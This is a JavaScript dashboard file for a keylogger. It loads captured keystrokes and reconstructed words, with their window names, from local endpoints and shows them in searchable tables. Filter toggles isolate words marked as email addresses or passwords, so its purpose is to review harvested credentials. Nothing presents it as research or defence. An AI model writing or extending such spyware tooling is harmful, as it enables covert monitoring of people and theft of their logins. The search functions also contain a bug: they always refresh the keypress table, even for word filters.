$(document).ready(function(){
    // Initialise toggle buttons
    $('#emailToggle').bootstrapToggle();
    $('#passwordToggle').bootstrapToggle();

    // Initialise and populate keypresses table
    $('#tableKeypresses').DataTable({
        data: getKeyData(),
        columns: [
            { data: 'datetime' },
            { data: 'processedKey' },
            { data: 'windowName' },
            { data: 'isKeyDown' }
        ],
        "order": [[ 0, "desc" ]]

    });

    // Initialise and populate words table
    $('#tableWords').DataTable({
        data: getWordData(),
        columns: [
            { data: 'datetime' },
            { data: 'windowName' },
            { data: 'processedWord' },
            { data: 'isEmail'},
            { data: 'isPassword' }
        ],
        "order": [[ 0, "desc" ]]

    });
    $('.dataTables_length').addClass('bs-select');

    // Search functionality for toggles
    // ======================
    // =
    // =    Key toggles
    // =
    // ======================
    $('#keydownToggle').change(function () {
        var keyDownQuery = "isKeyDown"
        if (this.checked) {
            addSearchParameter(keySearches, keyDownQuery)
        } else {
            removeSearchParameter(keySearches, keyDownQuery)
        }
    });

    $('#noneToggle').change(function () {
        var noneQuery = "^((?!None).)*$"
        if (this.checked) {
            addSearchParameter(keySearches, noneQuery)
        } else {
            removeSearchParameter(keySearches, noneQuery)
        }
    });

    // ======================
    // =
    // =    Word toggles
    // =
    // ======================
    $('#emailToggle').change(function () {
        var emailQuery = "isEmail"
        if (this.checked) {
            addSearchParameter(wordSearches, emailQuery)
        } else {
            removeSearchParameter(wordSearches, emailQuery)
        }
    });

    $('#passwordToggle').change(function () {
        var passwordQuery = "isPassword"
        if (this.checked) {
            addSearchParameter(wordSearches, passwordQuery)
        } else {
            removeSearchParameter(wordSearches, passwordQuery)
        }
    });

    
})



// =========================
// =
// =        Searching
// =
// =========================
// Searches are stored as strings inside an array
var keySearches = new Set();
var wordSearches = new Set();
var keyTable = $('#tableKeypresses').DataTable();
var wordTable = $('#tableWords').DataTable();

// When passed into datatable, these strings will become a single string,
//      with each element separated by a space (" ")

// Add search parameter for table
function addSearchParameter(set, query) {
    set.add(query);
    updateTable(keyTable, keySearches);

}

// Remove search parameter for table
function removeSearchParameter(set, query) {
    set.delete(query);
    updateTable(keyTable, keySearches);

}

// Convert SET of search queries into string
function generateSearchQuery(set) {
    strArr = [] // store in temporary array
    for (str of set) {
        strArr.push(str);
    }
    return strArr.join(" ")
}

// Refresh table with updated search parameters
function updateTable(table, searchSet) {
    table.search(generateSearchQuery(searchSet), true).draw();
}

// =========================
// =
// =        Keys
// =
// =========================
class Key {
    constructor(datetime, isKeyDown, windowName, processedKey) {
        this.datetime = datetime;
        if (isKeyDown) {
            this.isKeyDown = "isKeyDown"
        } else {
            this.isKeyDown = "notKeyDown"
        }
        this.windowName = windowName;
        this.processedKey = processedKey;

    }
}

function getKeyData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showKeylog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Key(el.datetime, el.isKeyDown, el.windowName, el.processedKey)
        );
    });

    return res
}


// =========================
// =
// =        Words
// =
// ========================

class Word {
    constructor(datetime, windowName, processedWord, isEmail, isPassword) {
        this.datetime = datetime;
        this.windowName = windowName;
        this.processedWord = processedWord;

        if (isEmail) {
            this.isEmail = "isEmail"
        } else {
            this.isEmail = "notEmail"
        }
        
        if (isPassword) {
            this.isPassword = "isPassword"
        } else {
            this.isPassword = "notPassword"
        }

    }
}

function getWordData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showWordlog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Word(el.datetime, el.windowName, el.processedWord, el.isEmail, el.isPassword)
        );
    });

    return res
}


